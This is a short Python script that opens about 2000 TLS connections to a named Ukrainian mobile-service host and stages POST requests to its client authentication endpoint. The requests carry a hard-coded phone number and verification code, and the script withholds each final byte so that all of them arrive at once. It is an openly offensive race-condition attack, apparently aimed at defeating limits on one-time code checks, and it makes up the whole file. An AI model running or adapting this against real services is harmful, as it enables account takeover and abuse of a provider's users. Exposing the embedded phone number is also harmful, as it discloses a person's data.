import asyncio
import json
import socket
import ssl
import time

import uvloop

from aiosocket.aiosocket import AsyncSocket
from aiosocket.http import read_http_response
from aiosocket.ssl import wrap_async_socket, AsyncSSLSocket

HOST = "tosim.sim23.ua"
ADDR = (socket.gethostbyname(HOST), 443)
SSL_CONTEXT = ssl.create_default_context()


def craft_request():
    request_line = (
        "POST /api/v1/client/auth HTTP/1.1\r\n"
    )

    data = json.dumps({
        'phone': '+380956409567',
        'code': '1252',
    })

    content_len = len(data.encode())
    headers = {
        'user-agent': 'Android:11;version:1.12.0;Google sdk_gphone_x86',
        'content-type': 'application/json',
        'accept': 'application/json',
        'host': 'tosim.sim23.ua',
        "content-length": content_len,
        "host": HOST
    }
    headers = "".join([f"{key.lower()}: {value}\r\n" for key, value in headers.items()])

    request = (request_line + headers + "\r\n" + data).encode("utf-8")
    return request


async def open_socket():
    async_socket = AsyncSocket(socket.AF_INET, socket.SOCK_STREAM)
    await async_socket.connect(ADDR)
    async_ssl_socket = await wrap_async_socket(async_socket, context=SSL_CONTEXT, server_hostname=HOST)
    return async_ssl_socket


async def get_response(sock):
    res = await read_http_response(sock)
    # if res.status_code != 200:
    print(res)
    # return res


async def do_request2(sock):
    req = craft_request()
    req, last_byte = req[:-1], req[-1:]
    sent = await sock.send(req)

    # print(sent)

    async def last_byte_sender():
        await sock.send(last_byte)

    return last_byte_sender


async def main():
    # print(res)
    # sockets = [await open_socket() for i in range(1000)]
    start = time.time()
    sockets = await asyncio.gather(*[open_socket() for _ in range(2000)], return_exceptions=True)
    # sockets = [await open_socket() for i in range(200)]
    end = time.time()
    print(end - start)
    start = time.time()
    for i in range(100):
        res = await asyncio.gather(*[do_request2(sock) for sock in sockets if isinstance(sock, AsyncSSLSocket)], return_exceptions=True)
    print(res)
    end = time.time()
    print(end - start)

    start = time.time()
    res = await asyncio.gather(*[send_last_byte() for send_last_byte in res if callable(send_last_byte)],
                               return_exceptions=True)
    end = time.time()
    print(end - start)

    await asyncio.gather(*[get_response(sock) for sock in sockets], return_exceptions=True)

    print(res)


if __name__ == "__main__":
    uvloop.run(main())
